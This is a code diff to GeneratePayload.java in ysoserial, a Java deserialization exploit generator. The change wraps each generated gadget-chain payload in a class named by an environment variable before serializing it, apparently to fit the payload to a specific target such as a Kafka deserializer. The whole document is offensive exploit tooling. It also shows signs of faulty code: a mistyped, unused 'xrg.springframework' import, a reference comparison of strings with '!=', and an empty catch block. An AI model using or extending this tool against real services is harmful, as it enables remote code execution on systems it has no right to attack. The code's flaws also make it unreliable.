@@ -1,12 +1,15 @@
 package ysoserial;
 
 import java.io.PrintStream;
+import java.lang.reflect.Field;
 import java.util.*;
 
+import xrg.springframework.kafka.support.serializer.DeserializationException;
 import ysoserial.payloads.ObjectPayload;
 import ysoserial.payloads.ObjectPayload.Utils;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.util.Reflections;
 
 @SuppressWarnings("rawtypes")
 public class GeneratePayload {
@@ -31,8 +34,18 @@ public class GeneratePayload {
 
 		try {
 			final ObjectPayload payload = payloadClass.newInstance();
-			final Object object = payload.getObject(command);
+			Object object = payload.getObject(command);
 			PrintStream out = System.out;
+            try {
+                String szOutClass = System.getenv("OutClassName");
+                if ("" != szOutClass) {
+                    Object val = Class.forName(szOutClass).newInstance();
+                    Field valfield = val.getClass().getDeclaredField("foo");
+                    Reflections.setAccessible(valfield);
+                    valfield.set(val, object);
+                }
+            }catch (Throwable e3) {}
+
 			Serializer.serialize(object, out);
 			ObjectPayload.Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
